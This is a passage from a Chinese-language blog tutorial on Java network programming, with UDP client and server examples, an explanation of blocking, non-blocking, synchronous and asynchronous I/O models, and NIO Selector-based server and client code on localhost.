TCP运行结果</figcaption></figure><p>在这个过程中我重启了两次客户端程序，可以看到：</p><ul><li>每次的本地客户端端口都是随机选取的。</li><li>客户端程序结束了，但服务端会一直<strong>阻塞</strong>在<code>accept()</code>等待新的连接。</li></ul><h3 id="udp">UDP</h3><p>相较于TCP需要三次握手建立连接的过程，UDP协议不需要该过程，当然也没提供TCP那些什么滑动窗口、差错控制等等，毕竟你看他报文那么简单嘛。</p><p>我们还是看看C语言中是什么样子的，具体如下：</p><figure><img src="/img/Java网络编程模型Review/IMG_20230103_130921.jpg"alt="UDP报文格式" /><figcaption aria-hidden="true">UDP报文格式</figcaption></figure><p>仍然是分开看一下Java中客户端和服务器端要做的事情：</p><p>服务端：</p><ul><li>创建UDP类型套接字并绑定IP、端口</li><li>阻塞等待接收数据报文</li><li>接收后处理并返回</li><li>关闭套接字</li></ul><p>客户端：</p><ul><li>创建UDP类型套接字</li><li>向服务端发送数据报文</li><li>接收数据包</li><li>关闭套接字</li></ul><p>为了实现上述功能，Java中定义了<code>java.net.DatagramPacket</code>和<code>java.net.DatagramSocket</code>来负责上述功能，我们通过<code>DatagramPacket</code>来封装和解封数据，用<code>DatagramSocket</code>来发送<code>DatagramPacket</code>数据包。</p><figure><img src="/img/Java网络编程模型Review/UDP数据结构.png"alt="Java中UDP网络编程常用类" /><figcaption aria-hidden="true">Java中UDP网络编程常用类</figcaption></figure><h4 id="服务端代码-1">服务端代码</h4><p>这里实现的功能与上一章节相同，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UDP 服务端 - 同步阻塞模式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BIOUDPServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ArrayList&lt;String&gt; DICT = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(</span><br><span class="line">            Arrays.asList(<span class="string">&quot;Zero&quot;</span>, <span class="string">&quot;One&quot;</span>, <span class="string">&quot;Two&quot;</span>, <span class="string">&quot;Three&quot;</span>, <span class="string">&quot;Four&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Five&quot;</span>, <span class="string">&quot;Six&quot;</span>, <span class="string">&quot;Seven&quot;</span>, <span class="string">&quot;Eight&quot;</span>, <span class="string">&quot;Nine&quot;</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">DatagramSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">6667</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">DatagramPacket</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">                <span class="comment">// 接收数据包</span></span><br><span class="line">                server.receive(request);</span><br><span class="line">                <span class="comment">// 收到请求</span></span><br><span class="line">                System.out.println(<span class="string">&quot;# 客户端数据报：&quot;</span> + request.getAddress() + <span class="string">&quot;:&quot;</span> + request.getPort() + <span class="string">&quot;#&quot;</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(request.getData()));</span><br><span class="line">                <span class="type">byte</span>[] data = DICT.get(index).getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                <span class="type">SocketAddress</span> <span class="variable">clientAddress</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(request.getAddress(), request.getPort());</span><br><span class="line">                <span class="type">DatagramPacket</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, data.length, clientAddress);</span><br><span class="line">                server.send(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端代码-1">客户端代码</h4><p><strong>注意</strong>，在UDP下创建客户端的Socket时，和TCP是有区别的，TCP中我们使用：<code>new Socket("127.0.0.1", 6666);</code>，这个端口指的是远程的端口。而在UDP客户端socket初始化时，<code>new DatagramSocket(0)</code>，这里填写的<strong>可不是远程的，而是本地的</strong>，0代表随机选择一个。客户端代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UDP 客户端 - 同步阻塞模式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BIOUDPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 设置绑定的本地端口，0代表随机选择</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">DatagramSocket</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// 设置超时（单位：毫秒）</span></span><br><span class="line">            client.setSoTimeout(<span class="number">10000</span>);</span><br><span class="line">            <span class="comment">// 创建数据报</span></span><br><span class="line">            <span class="type">SocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6667</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">wordToInquire</span> <span class="operator">=</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] dataToSend = wordToInquire.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">requestPacket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(dataToSend, dataToSend.length, remote);</span><br><span class="line">            <span class="comment">// 构造接收的报文</span></span><br><span class="line">            <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span>];</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">recvedPacket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, data.length);</span><br><span class="line">            client.send(requestPacket);</span><br><span class="line">            client.receive(recvedPacket);</span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(recvedPacket.getData()).trim());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行结果-1">运行结果</h4><figure><img src="/img/Java网络编程模型Review/image-20230104005528740.png"alt="BIO UDP运行结果" /><figcaption aria-hidden="true">BIO UDP运行结果</figcaption></figure><p>在这个过程中我重启了两次客户端程序，可以看到：</p><ul><li>每次的本地客户端端口都是随机选取的（左边服务器端显示的日志）。</li><li>客户端程序结束了，但服务端会一直<strong>阻塞</strong>在<code>receive()</code>等待新的数据包。</li></ul><h1 id="java中三种io模型及其实现">Java中三种I/O模型及其实现</h1><p>知道基本的Socket、TCP/UDP相关java的API使用方式后，我们就要深究一下，有哪些IO模式了，通常上，我们使用两个指标来划分，即：<strong>同步</strong>or<strong>异步</strong>，<strong>阻塞</strong>or<strong>非阻塞</strong>。那同步异步区别在哪呢？它们的区别在<strong>消息通信机制</strong>上，同步为<code>Synchronous Communication</code>，而异步为<code>Aynchronous Communication</code>，具体来说：</p><ul><li>同步模式下，我们调用一个方法，在这个方法完成前，我们需要一直<strong>主动</strong>等待它（这个主动的理解很关键），没得到结果前我们会一直等着。</li><li>异步模式下，同样一个方法，我们调用后将直接返回，在它完成前，我们不需要等待他，而是由它<strong>主动</strong>通知我们，<strong>结果</strong>好了，可以使用了。通知方法如信号、回调函数等。</li></ul><p>ok，那同步异步的区别实际上就是看是我们<strong>主动</strong>等结果，还是结果<strong>主动</strong>通知我们了。那阻塞和非阻塞呢？</p><ul><li>阻塞IO下，执行阻塞的系统调用（如前面我们看到的<code>receive</code>）当前线程会被挂起，等待<strong>系统调用的完成</strong>。</li><li>非阻塞IO下，与阻塞相反，非阻塞的系统调用会直接返回一个<strong>瞬时</strong>的结果，无需等待系统调用的完成。然后通过<strong>轮询</strong>的方式去判断调用是否完成。典型的例子如<code>select</code>系统调用，它可以<strong>轮询</strong>检测活动的socket而无需等待，有I/O可用时将直接返回。</li></ul><p>所以根据同步异步的<strong>消息通信机制</strong>，以及阻塞非阻塞的IO方式，我们可以排列组合得到如下集中IO模型：</p><ul><li>同步阻塞</li><li>同步非阻塞</li><li><del>异步阻塞</del></li><li>异步非阻塞（其实没这个说法，直接就叫异步）</li></ul><p>哎为什么没有异步阻塞呢？因为前面我们说异步模式下，方法会直接返回无需等待，所以<strong>异步一定是非阻塞的</strong>。但是反过来可就不对了（如select同步非阻塞）。</p><p>所以从大的方面上来说，我们有三种IO模型。实际上，Unix中有5种IO模型，划分更为细致。分别为：</p><ul><li>BlockingIO（同步阻塞），可以看到流程其实和我们UDP程序逻辑是一样的，也即Java原始的<strong>BIO</strong></li></ul><figure><img src="/img/Java网络编程模型Review/阻塞模式.jpg" alt="阻塞模式" /><figcaption aria-hidden="true">阻塞模式</figcaption></figure><ul><li>NonBlocking IO （同步非阻塞，轮询）</li></ul><figure><img src="/img/Java网络编程模型Review/非阻塞模式.jpg"alt="非阻塞模式" /><figcaption aria-hidden="true">非阻塞模式</figcaption></figure><ul><li>IO Multiplexing（如select、poll）（同步阻塞，但相较于BlockingIO，能监听更多的socket）。这也是<strong>Java的NIO原理</strong>，这个有大量的应用，比如你Nginx。</li></ul><figure><img src="/img/Java网络编程模型Review/IO多路复用.jpg"alt="IO多路复用" /><figcaption aria-hidden="true">IO多路复用</figcaption></figure><ul><li>Signal-Driven（同步非阻塞，当IO操作<strong>准备好时</strong>会通过信号通知）</li></ul><figure><img src="/img/Java网络编程模型Review/信号驱动.jpg" alt="信号驱动" /><figcaption aria-hidden="true">信号驱动</figcaption></figure><ul><li>AsynchronousIO（异步，当IO操作<strong>完成时</strong>会通过信号通知）。这也是<strong>Java的AIO原理</strong>。</li></ul><figure><img src="/img/Java网络编程模型Review/异步.jpg" alt="异步" /><figcaption aria-hidden="true">异步</figcaption></figure><p>注意，前四种都是同步的，这是因为他们都需要调用<code>receive</code>等方法将<strong>数据从内核空间复制到用户空间</strong>，都会导致当前线程挂起。而只有异步的IO模型，是真正不需要这个操作的（上图中没有出现如<code>recvform</code>的系统阻塞调用）。这五种模型的比较如下图所示：</p><figure><img src="/img/Java网络编程模型Review/5种IO模型比较.jpg"alt="UNIX中5种IO模型比较" /><figcaption aria-hidden="true">UNIX中5种IO模型比较</figcaption></figure><h2 id="bio">BIO</h2><p>BIO（BlockingIO），即IO是阻塞的状态，其实上一章节中我们的BIOServer就是阻塞的，即服务器会<strong>阻塞在accept/receive，等待客户端的连接</strong>，这个时候你的程序是干不了其他事情的。<strong>BIO是一种同步阻塞的机制。</strong>具体详情前面的代码、示图已经说的很清楚了。Java中主要使用的就是<code>java.net.*</code>下面的类。</p><h2 id="nio">NIO</h2><p>JDK 1.4中java引入了NIO（NewIO），主要是使用了<code>Selector</code>实现了IO多路复用。其实在Linux中，该机制是通过<code>select</code>系统调用来实现的。</p><p>我写过一个简单的C语言的聊天室<ahref="https://github.com/lzwgiter/MyCWebStudy">项目</a>，感兴趣的可以看看，该项目就是用的<code>select</code>机制来实现的。当然也有更好的<code>epoll</code>可以替换。<strong>NIO本质上是一种利用了I/O多路复用技术的、同步非阻塞的机制。但是相较于BIO，可以处理更多的Socket。</strong></p><h3 id="使用方法">使用方法</h3><p>我们以TCP为例。Java中主要使用<code>java.nio.*</code>下的类来实现，常用的类如：<code>java.nio.channels.Selector</code>、<code>java.nio..channels.ServerSocketChannel</code>、<code>java.nio.channels.SocketChannel</code>。至于UDP，将上面的<code>ServerSocketChannel</code>和改为使用<code>DatagramChannel</code>即可，他们的关系如下：</p><figure><img src="/img/Java网络编程模型Review/NIO常用类关系图.png"alt="NIO常用类关系图" /><figcaption aria-hidden="true">NIO常用类关系图</figcaption></figure><p>用一张图表示的话，NIO的结构是这样的：</p><figure><img src="/img/Java网络编程模型Review/image-20230107200241928.png"alt="NIO结构" /><figcaption aria-hidden="true">NIO结构</figcaption></figure><p>下面我们就使用上述类写一个服务端和客户端，学习一下使用方法。</p><h4 id="服务端">服务端</h4><p>对于服务端，我们主要使用<code>java.nio.Selector</code>来监听多个socket，<strong>此时我们不需要手动for循环去判断哪一个socket可用，而是由操作系统通知JVM哪个socket可用读入或写入</strong>。</p><p>注意，在<code>select</code>时，Java会调用<code>java.nio.channels.spi.SelectorProvider</code>这个单例类的<code>provide()</code>方法来返回操作系统的具体实现。且当<code>select</code>时，当前线程会阻塞，等待有IO可用时、操作系统的通知。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SelectionKey;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.Selector;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.ServerSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Java NIO</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2022/12/30</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">             <span class="type">ServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> ServerSocketChannel.open()) &#123;</span><br><span class="line">            <span class="comment">// 设置为非阻塞模式</span></span><br><span class="line">            serverSocketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">            <span class="comment">// 绑定端口</span></span><br><span class="line">            serverSocketChannel.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">6666</span>));</span><br><span class="line">            <span class="comment">// 将serverSocketChannel的accept交由selector来处理</span></span><br><span class="line">            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line">            System.out.println(<span class="string">&quot;端口注册完成, 等待连接中......&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 阻塞在select方法</span></span><br><span class="line">            <span class="keyword">while</span> (selector.select() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 我们使用SelectionKey来对可用的socket进行遍历</span></span><br><span class="line">                Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">                <span class="comment">// 处理每一个事件</span></span><br><span class="line">                SocketChannel sc;</span><br><span class="line">                Iterator&lt;SelectionKey&gt; iter = selectionKeys.iterator();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 遍历每一个可用的socket</span></span><br><span class="line">                <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">                    <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> iter.next();</span><br><span class="line">                    <span class="keyword">if</span> (key.isAcceptable()) &#123;</span><br><span class="line">                        <span class="type">ServerSocketChannel</span> <span class="variable">nssc</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                        sc = nssc.accept();</span><br><span class="line">                        <span class="comment">// 设为非阻塞</span></span><br><span class="line">                        sc.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                        <span class="comment">// 注册并分配缓存区</span></span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">echoBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>);</span><br><span class="line">                        sc.register(selector, SelectionKey.OP_READ, echoBuffer);</span><br><span class="line">                        System.out.println(LocalDateTime.now() + <span class="string">&quot; - ** 新的连接 ** &quot;</span> + sc);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isReadable()) &#123;</span><br><span class="line">                        sc = (SocketChannel) key.channel();</span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">echoBuffer</span> <span class="operator">=</span> (ByteBuffer) key.attachment();</span><br><span class="line">                        <span class="comment">// 读取数据</span></span><br><span class="line">                        echoBuffer.clear();</span><br><span class="line">                        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sc.read(echoBuffer);</span><br><span class="line">                        <span class="keyword">if</span> (len == -<span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            echoBuffer.clear();</span><br><span class="line">                            <span class="type">String</span> <span class="variable">raw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(echoBuffer.array()).trim();</span><br><span class="line">                            System.out.println(LocalDateTime.now() + <span class="string">&quot; - ## 接收来自 &quot;</span> + sc + <span class="string">&quot;的数据：&quot;</span> + raw + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                            <span class="comment">// 处理消息</span></span><br><span class="line">                            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;MSG: &#123;&quot;</span> + raw + <span class="string">&quot;&#125; is accepted.&quot;</span>;</span><br><span class="line">                            echoBuffer.put(response.getBytes());</span><br><span class="line">                            echoBuffer.flip();</span><br><span class="line">                            sc.write(echoBuffer);</span><br><span class="line">                            System.out.println(LocalDateTime.now() + <span class="string">&quot; - ## 发送给 &quot;</span> + sc + <span class="string">&quot;的数据：&quot;</span> +</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">String</span>(echoBuffer.array()).trim() + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 关闭客户端连接</span></span><br><span class="line">                        sc.close();</span><br><span class="line">                        System.out.println(sc + <span class="string">&quot;连接结束&quot;</span>);</span><br><span class="line">                        System.out.println(<span class="string">&quot;===========================&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 从遍历集合中删除</span></span><br><span class="line">                    iter.remove();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;this is a simple test.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这里需要澄清一个小概念，我学习时就有疑惑</strong>。单线程下，若没有可用的I/O操作，那不就阻塞在<code>select</code>函数吗？啥都干不了啊？</p><p>实际上阻塞、非阻塞都是对于I/O操作来说的，由于I/O多路复用机制提供了单线程下操作多个I/O的方法，因此我们当前线程不会阻塞在单个I/O中。比如现在有两个个客户端连接进来了，ok我们处理了1号I/O，由于1没有新的消息了，因此我们会去处理2号I/O，<strong>而并没有阻塞在1号I/O上。</strong>因此说它是非阻塞的。</p><h4 id="客户端">客户端</h4><p>客户端代码要简单一些。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Java NIO客户端</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2022/12/30</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> SocketChannel.open(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">6666</span>))) &#123;</span><br><span class="line">            client.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;this is a simple test.&quot;</span>;</span><br><span class="line">            System.out.println(LocalDateTime.now() + <span class="string">&quot; - ##发送数据: &quot;</span> + msg + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>);</span><br><span class="line">            buffer.put(msg.getBytes());</span><br><span class="line">            buffer.flip();</span><br><span class="line">            client.write(buffer);</span><br><span class="line">            buffer.clear();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> client.read(buffer);</span><br><span class="line">                <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(LocalDateTime.now() + <span class="string">&quot; - ##接收数据: &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(buffer.array()).trim() + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                    client.close();</span><br><span class="line">                    System.out.println(LocalDateTime.now() + <span class="string">&quot; - ##连接关闭: &quot;</span> + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果-2">运行结果</h3><figure><img src="/img/Java网络编程模型Review/image-20230107011032615.png"alt="NIO运行结果" /><figcaption aria-hidden="true">NIO运行结果</figcaption></figure><h2 id="aio">AIO</h2><p>JDK 1.7引入了NIO2.0，也即AIO（AsynchronousIO），他为我们提供了异步的可能性，如异步的文件通道、异步的套接字通道，他的底层在Windows中是通过<code>IOCP（I/O 